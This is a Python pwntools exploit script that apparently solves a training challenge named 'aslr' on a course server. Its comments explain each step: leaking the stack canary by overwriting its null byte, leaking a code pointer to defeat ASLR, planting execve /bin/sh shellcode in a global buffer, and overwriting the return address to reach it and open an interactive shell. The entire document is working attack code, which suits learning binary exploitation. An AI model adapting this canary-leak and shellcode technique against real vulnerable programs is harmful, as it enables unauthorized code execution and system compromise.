from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
	r = process("./aslr")
	gdb.attach(r, """
	c
	""")
	input("wait")
else:
	r = remote("bin.training.jinblack.it", 2012)

#In this case we need to leak the canary. We don't have a vulnerability that let us avoid writing on it.

shellcode = b"\x90\x90\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"
ps1 = shellcode.ljust(99, b"\x90") #ps1 is called buffer_in_bss in ghidra (bss is for global variables infact)
r.sendline(ps1) #It also sends a \n at the end
time.sleep(0.1) #To be sure that we are sending the right amount of data 
#(it is not necessary if you have a \n)

#104 buffer length + 1 byte to overwrite the 0x00 of the canary
stackstuff = b"B"*105
r.send(stackstuff) #No \n at the end
time.sleep(0.1)

r.recvuntil(b"> ")
r.recv(105) #Jump 105 byte in receiving
canary = u64(b"\x00" + r.recv(7)) #canary #u64 convert to unsigned integer of 64bit
print("canary: %#x" % canary) # the '#' inside means that it will be a number of the type 0x
#and the %x is the hex formatter


payload_to_leak_stack = b"B" * (104 + 9*8) #104 for buffer + 5 variables + 1 stack base pointer (canary included in variables)
r.send(payload_to_leak_stack) #No \n at the end
time.sleep(0.1)


r.recvuntil(b"> ")
r.recv(104 + 9*8) #104 for buffer + 5 variables + 1 stack base pointer (canary included in variables)
stack = u64(r.recv(6) + b"\x00\x00") #The two \x00 are needed because the stack is 32 byte long
print("stack leak: %#x" % stack) # current instruction pointer

delta = 0x555555755080 - 0x555555554830   #(ps1 - _start) _from_start_to_ps1  _start
print("delta: %#x" % delta)
buffer_position = stack + delta
#buffer_position = 0x555555755080 it works only in local where there is no aslr
print("buffer: %#x" % buffer_position)

address = buffer_position

payload = b"\x90"*104 + p64(canary) + b"D"*8 + p64(address)
#D*8 is necessary to overwrite the EBP
r.send(payload) #no \n
time.sleep(0.1)

r.send(b"\n")
r.interactive()

